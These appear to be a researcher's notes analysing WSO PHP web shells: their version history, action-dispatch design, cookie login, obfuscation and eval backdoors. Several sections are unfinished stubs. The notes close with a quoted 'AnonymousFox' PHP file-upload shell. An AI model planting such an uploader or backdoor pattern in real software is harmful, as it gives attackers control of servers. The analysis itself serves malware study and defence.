# WSO Web Shells in depth

"Web shell" - what is it for?

If they were standalone, they'd be "remote access trojans",
or if legitimately installed, they'd be "remote support software",
like [Dameware](https://www.dameware.com/).

https://www.wordfence.com/blog/2017/06/wso-shell/
https://forum.antichat.ru/threads/103155/

A family of programs, modified in the wild by everyone.

![WSO phylogeny](wso_phylogeny.png?raw=true)

## Origin

![oRb's avatar](orb_avatar.jpg?raw=true)

## Timeline

###

2.1 - 2.5 orderly development by oRb (?)

### Feature and bug fix progression

I know the most primitive versions as "WSO_VERSION" of 2.0,
I can't find a 1.x version.

* 2.0
* 2.1
* 2.2
* 2.3
* 2.4
* 2.5 

### 4.x HardLinux variants

Started with WSO 2.4,
worked from there,
development hosted by github.

## Design

WSO is a PHP program.
It executes on a HTTP server, in the context of some daemon process.
It takes actions on the server because WSO is a "shell",
or maybe a "remote access trojan",
generates HTML appropriate for those actions,
then sends the HTML back for a browser to display.
Virtually all PHP programs do something like this.

It uses the `_POST` superglobal variable rather than `_REQUEST`
Effort to be compatible with past versions of PHP,
old code,
or coder that never learned anything new?

HTML composed as PHP strings, output using `echo()` (?) instead of
interweaving blocks of code that output HTML with blocks of HTML.

### HTTP Parameters and action dispatch

| Name | Meaning |
|:------:|---------|
|   a    | Category of action |
| ajax   | |
|   c    | Current working directory |
|charset | character set to use in display |
|  pass    | authentication password |
|  p1    | action's parameter 1 |
|  p2    | action's parameter 2 |
|  p3    | action's parameter 3 |

The parameter named "a" is the most important:
it gets used to pick an "action",
which gets called via PHP's `call_user_func()` builtin.
I'd argue that the "a" parameter, action functions,
and `call_user_func()` action dispatch are what makes a
WSO webshell.
This is a unique, distinctive feature of all WSO variants.

    if (!empty($_POST['a']) && function_exists('action' . $_POST['a'])) {
        call_user_func('action' . $_POST['a']);
    }

I suspect that between `call_user_func()`,
the modularity provided by the action functions,
and keeping HTML in PHP strings (rather than interleaved code and HTML),
the ease of modifying WSO has led to the explosion in variations.


### Login Cookie

| Cookie Name  | Cookie Value |
|--------------|--------------|
|`md5($_SERVER['HTTP_HOST'])`|`md5($password)`|


Invoking with parameter "pass" set cookie for later access.
`setcookie($k, $v);`

This feature allows attackers to invoke WSO instances with
either a POST parameter named "pass" and the correct value,
or with a cookie, no explicit login needed.
This often happens when attackers invoke `actionRC`,
"a=RC" POST parameter and value.

### "action" functions

The value of the POST parameter named "a" determines a category
of things that WSO can do.
The functions available vary by version.



|WSO version |SecInfo             |Php|FilesMan|StringTools|FilesTools|SafeMode|Console|Logout|SelfRemove|Bruteforce|Sql|Network|RC|Domain|Framer|Infect|Mass|
|:------------|:------------------|:--------|:-------|:------|:------|:--------|:----------|:------|:------|:------|:----|:-------|:---|:---|:--------|:--------|:-------|
|2.0   |X|X|X|X|X|X|X|X|X|X|X| | | | | | |
|2.1   |X|X|X|X|X|X|X|X|X|X|X|X| | | | | |
|waw   |X|X|X|X|X|X|X|X|X|X|X|X| |X| |X| |
|wew   |X|X|X|X|X|X|X|X|X|X|X|X| | | | | |
|2.2   |X|X|X|X|X|X|X|X|X|X|X|X|X| | | | |
|2.3   |X|X|X|X|X|X|X|X|X|X|X|X|X| | | | |
|2.4   |X|X|X|X|X|X|X|X|X|X|X|X|X| | | | |
|bogel |X|X|X|X|X|X|X|X|X|X|X|X|X| | | | |
|2.6   |X|X|X|X|X|X|X|X|X|X|X|X|X| | | | |
|2.7   |X|X|X|X|X|X|X|X|X|X|X|X|X| | | | |
|3.0   |X| |X|X|X|X|X| |X| |X|X|X|X| | |X|
|3.1   |X|X|X|X|X|X|X|X|X|X|X|X|X| |X| | |
|4.1.1 |X|X|X|X|X|X|X|X|X|X|X|X|X| | |X| |
|4.2.5 |X|X|X|X|X|X|X|X|X|X|X|X|X| | |X| |
|Jijle3|X|X|X|X|X|X|X|X|X|X|X|X|X|X| | | |
|Mystery%20Backdoor|X|X|X|X|X|X|X|X|X|X|X|X| | | | | |
|2.5   |X|X|X|X|X| |X|X|X|X|X|X|X| | | | |
|2.5.1 |X|X|X|X|X| |X|X|X|X|X|X|X| | | | |
|2.8   |X|X|X|X|X| |X|X|X|X|X|X|X| | | | |
|2.9   |X|X|X|X|X| |X|X|X|X|X|X|X| | | | |
|WEBAPP|X|X|X|X|X| |X|X|X|X|X|X|X| | | | |
|f4    | |X| | | | | |X|X| |X|X|X| | | | |
|ws_ver2|X|X|X| |X| | | | | | | |X| | | | |

"bogel" is just WSO 2.4 with the string "bogel" substituted
for any string matching `[Ww][Ss][Oo]`.
Several other string-substituted variants occur.

The Russian 4.x variants descend from 2.4 -
they use a PHP session to keep state rather than keeping state in a cookie.

WSO 2.5.1 is WSO 2.5 with a "call home" borrowed from fx29
web shells. WSO 2.8 is 2.5.1 with another "call home".

## Methods of obfuscation

Can't be exhaustive - too numerous to list them all.

FOPO
mod_tumblr "plugin"
eval(gzinflate(base64_decode($something)));

## Common URLs? Is this worth it?

### actionRC

	-- called 2 ways: w and w/o value for parameter "p1"
	-- acts as an immediate eval backdoor if parameter named "p1"
is present and contains PHP source code.
Why use "Php" or "Console" actions for this, which does happen.

### actionPhp, actionConsole

### actionNetwork

`function actionNetwork` first appears in version 2.1

Perl and C source code for "bind shells" and shell servers,
all source kept in base64-encoded strings,
C compiled and executed on demand.
C shell and bind shell eliminated in version 2.3

## Vigilante Malware Remover

	-- vigilance committe cookie

## Invocations

	-- all the passwords ever

MD5 hashes of passwords.

eval in password fields:

<?php
echo "Hacked By AnonymousFox\n";
{
$saw1 = $_FILES['file']['tmp_name'];
$saw2 = $_FILES['file']['name'];
echo "<form method='POST' enctype='multipart/form-data'>
<input type='file'name='file' />
<input type='submit' value='upload shell' />
</form>";
move_uploaded_file($saw1,$saw2);
}
?>
